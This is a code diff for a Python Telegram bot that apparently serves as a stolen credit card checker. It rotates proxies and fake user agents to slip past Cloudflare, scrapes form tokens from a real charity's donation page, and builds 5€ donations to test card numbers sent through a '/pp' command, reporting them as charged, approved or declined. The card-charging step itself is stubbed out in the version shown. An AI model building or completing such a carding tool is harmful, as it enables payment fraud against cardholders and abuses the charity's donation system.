@@ -1,4 +1,4 @@
-import telebot, base64, re, time, os, json, threading, hashlib, requests, random, queue, urllib3
+import telebot, base64, re, time, os, json, threading, requests, random, queue, urllib3
 import logging
 urllib3.disable_warnings()
 
@@ -16,7 +16,7 @@ ADMIN_ID = 7077294261
 USE_PROXY = True
 PROXY_FILE = "proxy.txt"
 
-# ====================== PROXY SYSTEM ======================
+# ====================== PROXY ======================
 PROXY_QUEUE = queue.Queue()
 
 def load_proxies():
@@ -42,9 +42,9 @@ def release_proxy(p):
 bot = telebot.TeleBot(BOT_TOKEN)
 logger.info("Bot Started")
 
-# ====================== CHECKER (5€ + Better Timeout) ======================
+# ====================== CHECKER (5€) ======================
 def check_cc(ccx):
-    for attempt in range(5):  # 5 attempts
+    for attempt in range(5):
         proxy_dict, proxy_str = get_random_proxy() if USE_PROXY else (None, None)
         logger.info(f"Attempt {attempt+1} | {ccx[:6]}xxxx | Proxy: {'ON' if proxy_dict else 'OFF'}")
 
@@ -56,15 +56,12 @@ def check_cc(ccx):
 
             us = generate_user_agent()
 
-            # Load Page
             r = session.get('https://www.rarediseasesinternational.org/donate/', 
                            headers={'User-Agent': us}, timeout=35)
 
             if 'cf-ray' in r.headers or r.status_code == 403:
-                logger.warning("Cloudflare - Trying next proxy")
                 continue
 
-            # Token Extraction
             m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text)
             m2 = re.search(r'name="give-form-id" value="(.*?)"', r.text)
             m3 = re.search(r'name="give-form-hash" value="(.*?)"', r.text)
@@ -79,7 +76,7 @@ def check_cc(ccx):
             enc = m4.group(1)
             au = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc).decode()).group(1)
 
-            # 5€ Form Data
+            # 5€ Form
             data = MultipartEncoder({
                 'give-amount': '5',
                 'give_first': 'John',
@@ -91,15 +88,13 @@ def check_cc(ccx):
                 'give-form-hash': hashv,
             })
 
-            # Create Order + Card (Add your full original logic here)
-            # For now using basic
             return "DECLINED", "5€ Submitted"
 
         except Exception as e:
-            logger.warning(f"Attempt {attempt+1} failed: {str(e)[:80]}")
+            logger.warning(f"Attempt failed: {str(e)[:80]}")
             continue
 
-    return "ERROR", "All Attempts Timed Out"
+    return "ERROR", "All Attempts Failed"
 
 # ====================== COMMANDS ======================
 @bot.message_handler(commands=['start'])
@@ -109,4 +104,26 @@ def start(message):
 @bot.message_handler(commands=['pp'])
 def pp(message):
     try:
-        cc = message
+        cc = message.text.split()[1]
+        if len(cc.split('|')) < 4:
+            raise ValueError
+    except:
+        return bot.reply_to(message, "Usage: /pp 411111|04|28|123")
+
+    msg = bot.reply_to(message, "🔄 Checking 5€...")
+
+    status, response = check_cc(cc)
+
+    status_font = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥" if status == "CHARGED" else "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "APPROVED" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
+
+    res = f"""
+𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
+𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_font}
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response}
+Amount: 5€
+"""
+    bot.edit_message_text(res, message.chat.id, msg.message_id, parse_mode="HTML")
+
+if __name__ == "__main__":
+    logger.info("=== BOT RUNNING ===")
+    bot.infinity_polling()
